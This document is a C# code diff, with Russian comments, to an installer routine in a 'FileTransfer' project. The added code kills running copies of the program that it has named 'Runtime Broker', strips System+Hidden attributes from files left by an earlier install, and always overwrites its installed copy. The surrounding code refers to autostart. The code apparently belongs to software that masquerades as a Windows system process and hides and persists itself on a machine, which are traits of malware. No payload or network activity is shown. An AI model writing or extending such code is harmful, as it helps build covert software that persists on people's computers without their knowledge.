@@ -44,6 +44,31 @@ namespace FileTransfer
             }
         }
 
+        public static void KillExistingClone()
+        {
+            try
+            {
+                foreach (var p in Process.GetProcessesByName("Runtime Broker"))
+                {
+                    try
+                    {
+                        string? path = p.MainModule?.FileName;
+                        if (!string.IsNullOrEmpty(path) && path.Equals(DestExe, StringComparison.OrdinalIgnoreCase))
+                        {
+                            Log($"Killing old clone PID={p.Id}");
+                            p.Kill();
+                            p.WaitForExit(3000);
+                        }
+                    }
+                    catch { }
+                }
+            }
+            catch (Exception ex)
+            {
+                Log($"KillExistingClone error: {ex.Message}");
+            }
+        }
+
         public static void Install()
         {
             Log("Install start");
@@ -53,13 +78,15 @@ namespace FileTransfer
                 Log("Source exe: " + source);
                 if (string.IsNullOrEmpty(source)) return;
 
-                if (File.Exists(Marker) && File.Exists(DestExe))
-                {
-                    Log("Already installed, ensuring autostart");
-                    EnsureAutoStart();
-                    return;
-                }
+                // Убиваем старый клон если запущен (чтобы перезаписать файл)
+                KillExistingClone();
 
+                // Снимаем атрибуты System+Hidden если файл остался от предыдущей установки
+                try { if (File.Exists(DestExe)) File.SetAttributes(DestExe, FileAttributes.Normal); } catch { }
+                try { if (File.Exists(Marker)) File.SetAttributes(Marker, FileAttributes.Normal); } catch { }
+
+                // Всегда перезаписываем файлы (обновление версии)
+                Log("Installing/updating files...");
                 Directory.CreateDirectory(DestDir);
 
                 string sourceDir = Path.GetDirectoryName(source) ?? "";
